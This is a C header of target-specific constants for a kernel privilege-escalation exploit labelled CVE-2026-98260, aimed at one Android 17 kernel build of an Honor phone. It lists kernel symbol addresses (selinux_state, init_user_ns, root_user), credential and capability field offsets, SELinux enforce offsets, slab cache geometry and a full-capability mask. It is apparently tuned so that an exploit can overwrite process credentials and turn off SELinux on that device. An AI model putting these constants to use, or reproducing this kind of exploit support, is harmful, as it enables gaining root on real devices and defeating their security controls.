/* pc98260_target_61821.h — CVE-2026-98260 per-build constants.
 *
 * Target: Honor WKL-AN20/WKL-AN80 (Magic9 Pro Max)
 *   kernel_release = 6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k
 *   4K pages, VA_BITS=39, Android 17
 *
 * Derived from boot (4).img (sha256 8848fb1f...) plus the exact-kernel
 * HOneClick syms table; trace call sites decoded from the image:
 *   do_timer_create 0xffffffc0803dffa4, bl kmem_cache_alloc at +0xb4
 *   prepare_creds   0xffffffc08014734c, bl kmem_cache_alloc at +0x28
 *   copy_process    0xffffffc080224568, bl kmem_cache_alloc_node at +0x13c
 *
 * Static derivation only; validate with --check before any plant.
 */
#ifndef PC98260_TARGET_61821_H
#define PC98260_TARGET_61821_H

#include <stdint.h>

#define TARGET_NAME          "honor-61821"
#define TARGET_KERNEL        "6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k"
#define TARGET_KERNEL_SHA256 "65fc12d5c39002c5f2ff2e14c439f9c3fb7489272450a7224cc84acd0a8a4705"

/* ---- absolute addresses (link-time; add g_slide at runtime) ---------- */
#define LINK_SELINUX_STATE   UINT64_C(0xffffffc08299a6f0)  /* selinux_state */
#define LINK_INIT_USER_NS    UINT64_C(0xffffffc0827110e0)  /* init_user_ns */
#define LINK_ROOT_USER       UINT64_C(0xffffffc082711390)  /* root_user    */
#define LINK_INIT_GROUPS     UINT64_C(0xffffffc082712a48)  /* init_groups  */
#define LINK_INIT_UCOUNTS    UINT64_C(0xffffffc082712f08)  /* init_ucounts */

/* ---- trace allocation call sites (recorded _RET_IP_ = BL+4) ---------- */
#define LINK_ALLOC_TIMER     UINT64_C(0xffffffc0803e005c)  /* do_timer_create+0xb8 */
#define LINK_ALLOC_CRED      UINT64_C(0xffffffc080147378)  /* prepare_creds+0x2c */
#define LINK_ALLOC_TASK      UINT64_C(0xffffffc0802246a8)  /* copy_process+0x13c */

/* ---- struct geometry (6.18.21 Android17 BTF/BRM measurements) -------- */
#define GEO_TASK_CRED        0x908   /* task_struct.cred          */
#define GEO_TASK_REAL_CRED   0x900   /* task_struct.real_cred     */
#define GEO_TASK_COMM        0x918   /* task_struct.comm          */
#define GEO_KITIMER_IT       0xe0    /* k_itimer.it (cpu_timer.node) */
#define GEO_KITIMER_SIZE     0x180   /* sizeof(k_itimer)          */
#define GEO_KITIMER_STRIDE   0x180   /* kmem_cache stride         */
#define GEO_CRED_SIZE        184     /* sizeof(struct cred)       */
#define GEO_CRED_ALLOC_SIZE  192     /* cred_jar cache object size */
#define GEO_CRED_UID         0x8
#define GEO_CRED_GID         0xc
#define GEO_CRED_SUID        0x10
#define GEO_CRED_SGID        0x14
#define GEO_CRED_EUID        0x18
#define GEO_CRED_EGID        0x1c
#define GEO_CRED_FSUID       0x20
#define GEO_CRED_FSGID       0x24
#define GEO_CRED_CAP_INH     0x30
#define GEO_CRED_CAP_PERM    0x38
#define GEO_CRED_CAP_EFF     0x40
#define GEO_CRED_CAP_BSET    0x48
#define GEO_CRED_CAP_AMB     0x50
#define GEO_CRED_SECURITY    0x80
#define GEO_CRED_USER        0x88
#define GEO_CRED_USER_NS     0x90
#define GEO_CRED_UCOUNTS     0x98
#define GEO_CRED_GROUP_INFO  0xa0
#define GEO_SELINUX_ENFORCE  0
#define GEO_SELINUX_INIT     1
#define GEO_SELINUX_WRITE    (-7)
#define GEO_SELINUX_SIZE     0x80

/* ---- slab geometry -------------------------------------------------- */
#define GEO_TASK_OBJSIZE            5248  /* 0x1480; runtime slabinfo overrides */
#define GEO_TASK_OBJ_PER_SLAB       0
#define GEO_TASK_SLAB_PAGES         0
#define GEO_POSIX_TIMER_OBJSIZE     0x180
#define GEO_POSIX_TIMER_OBJ_PER_SLAB 21
#define GEO_POSIX_TIMER_SLAB_ORDER  1
#define GEO_PAGE_SIZE               4096
#define GEO_FRAG_PAGE_SIZE          8192

/* ---- kernel addressing ---------------------------------------------- */
/* g928 KASAN/6.18 linear map starts 32 GiB above the generic VA_BITS=39
 * base.  Observed slab pointers (ffffff88.. / ffffff8b..) only produce
 * in-RAM PFNs with this base. */
#define GEOM_PAGE_OFFSET     UINT64_C(0xffffff8000000000)
#define GEOM_VA_BITS         39
#define GEOM_MEMSTART_PFN    UINT64_C(0x80000)
#define GEOM_MEMSTART_ADDR   UINT64_C(0xffffffc081a74a50) /* memstart_addr */

#define CAP_FULL             UINT64_C(0x1ffffffffff)

#endif /* PC98260_TARGET_61821_H */
